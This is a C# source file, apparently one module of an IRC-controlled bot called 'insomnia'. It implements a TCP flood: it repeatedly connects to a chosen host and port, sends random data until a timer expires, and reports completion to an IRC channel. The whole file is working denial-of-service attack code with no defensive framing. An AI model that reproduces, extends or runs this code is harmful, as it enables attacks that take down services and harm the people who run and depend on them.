using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace insomnia
{
    internal class TCP
    {
        public static string host;
        public static int delay;
        public static int port;
        public static bool isEnabled = false;

        public static void Begin()
        {
            try
            {
                int seconds = delay * 1000;
                new Thread(() => SendTCP(Functions.ipE(host, port))).Start();

                Thread.Sleep(seconds);
                if (isEnabled)
                {
                    Stop();
                    IRC.WriteMessage("TCP flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
                }
            }
            catch
            {
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private static void SendTCP(IPEndPoint ip)
        {
            Socket s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            while (isEnabled)
            {
                try
                {
                    s.Connect(ip.Address, port);
                    s.Send(tcpRandom());
                    s.Close();
                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                }
                catch 
                {
                    if (s.Connected)
                        s.Close();

                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    Thread.Sleep(2000);
                }
                Thread.Sleep(1);
            }


            // Cleanup
            if (s.Connected)
                s.Close();

            s = null;
        }

        private static byte[] tcpRandom()
        {
            byte[] b = new byte[Functions.rand.Next(1470, 5000)];
            Functions.rand.NextBytes(b);
            return b;
        }
    }
}
